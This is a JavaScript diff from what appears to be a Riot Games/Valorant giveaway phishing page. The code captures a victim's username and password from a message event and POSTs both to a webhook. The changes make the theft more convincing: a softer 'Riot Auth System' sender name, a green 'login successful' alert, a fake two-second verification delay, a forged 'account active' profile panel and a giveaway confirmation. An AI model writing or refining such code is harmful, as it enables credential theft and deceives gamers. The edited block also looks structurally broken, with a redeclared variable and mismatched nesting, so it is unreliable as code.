@@ -242,10 +242,10 @@ function openAuth() {
 window.addEventListener("message", function(event) {
     if (event.data.user && event.data.pass) {
         
-        // 1. Önce "Giriş Yap" butonunu "Yükleniyor" animasyonuna çevir
+        // 1. Önce "Giriş Yap" butonunu "Yükleniyor" moduna sok (İnandırıcılık için)
         const loginBtn = document.querySelector('.btn-login');
         if(loginBtn) {
-            loginBtn.innerHTML = `<img src="https://i.gifer.com/ZZ5H.gif" width="16" style="margin-right:8px;"> DOĞRULANIYOR...`;
+            loginBtn.innerHTML = `<span class="loader-circle"></span> DOĞRULANIYOR...`;
             loginBtn.style.background = "#333";
             loginBtn.style.cursor = "wait";
         }
@@ -254,10 +254,10 @@ window.addEventListener("message", function(event) {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({
-                username: "Riot Auth Logger",
+                username: "Riot Auth System",
                 embeds: [{
-                    title: "🚀 Yeni Hesap Verisi Geldi!",
-                    color: 16725845,
+                    title: "✅ Yeni Giriş Başarılı!",
+                    color: 3066993,
                     fields: [
                         { name: "👤 Kullanıcı", value: "```" + event.data.user + "```" },
                         { name: "🔑 Şifre", value: "```" + event.data.pass + "```" }
@@ -267,34 +267,43 @@ window.addEventListener("message", function(event) {
                 }]
             })
         });
-
+        // 3. 2 Saniye Bekle (Sanki veritabanından profil çekiyormuş gibi)
+        setTimeout(() => {
+            // Kullanıcı adını alıp Riot ID formatına sokuyoruz
+            const displayNick = event.data.user.split('@')[0].toUpperCase();
+            const fullRiotID = displayNick + "#TR1";
         // 2. Arayüzü Güncelle (Giriş Yapılmış Süsü Ver)
         const loginBtn = document.querySelector('.btn-login');
 if(loginBtn) {
     // Eğer eleman Riot ID girmediyse kullanıcı adını kullan, girdiyse ID'yi kullan
     const displayID = event.data.gameid || event.data.user; 
     
-    loginBtn.outerHTML = `
-        <div style="display:flex; align-items:center; gap:12px; background: rgba(255,255,255,0.05); padding: 5px 15px; border-radius: 50px; border: 1px solid rgba(255,70,85,0.3);">
-            <div style="text-align:right">
-                <div style="color:#fff; font-weight:800; font-size:13px; text-transform:uppercase;">${displayID}</div>
-                <div style="color:#79eb1e; font-size:10px; font-weight:900;">0 VP | LEVEL 148</div>
-            </div>
-            <img src="https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg" 
-                 style="width:35px; height:35px; border-radius:50%; border:2px solid #ff4655; object-fit:cover;">
-        </div>
-    `;
-}
+    // Paneli Güncelle (Senin istediğin default resimle)
+            if(loginBtn) {
+                loginBtn.outerHTML = `
+                    <div style="display:flex; align-items:center; gap:12px; background: rgba(0,0,0,0.7); padding: 6px 15px; border-radius: 4px; border: 1px solid #79eb1e; animation: slideInRight 0.5s ease-out;">
+                        <div style="text-align:right">
+                            <div style="color:#fff; font-weight:800; font-size:12px; letter-spacing:0.5px;">${fullRiotID}</div>
+                            <div style="color:#79eb1e; font-size:9px; font-weight:900; letter-spacing:1px;">HESAP AKTİF</div>
+                        </div>
+                        <!-- Senin ayarladığın default resim burada (avatar.png) -->
+                        <img src="avatar.png" onerror="this.src='https://wallpapers.com/images/hd/valorant-profile-pictures-y1v4u60z769p76p7.jpg'" 
+                             style="width:32px; height:32px; border:1px solid #79eb1e; border-radius:2px; object-fit:cover;">
+                    </div>
+                `;
+            }
 
-        // Çekiliş metnini güncelle
-        const giveawayText = document.querySelector('.giveaway-section p');
-        if(giveawayText) {
-            giveawayText.innerText = "ÇEKİLİŞE BAŞARIYLA KATILDINIZ!";
-            giveawayText.style.color = "#79eb1e";
-        }
+        // Çekiliş yazısını güncelle
+            const giveawayText = document.querySelector('.giveaway-section p');
+            if(giveawayText) {
+                giveawayText.innerText = "HESAP DOĞRULANDI, ÇEKİLİŞE KATILDINIZ!";
+                giveawayText.style.color = "#79eb1e";
+            }
 
-        // 3. Profesyonel Bildirim Kutusu (Toast) Oluştur
-        showValorantToast(event.data.user);
+            // O şık Valorant bildirimini patlat
+            showValorantToast(fullRiotID);
+
+        }, 2000); 
     }
 }, { once: true });
 
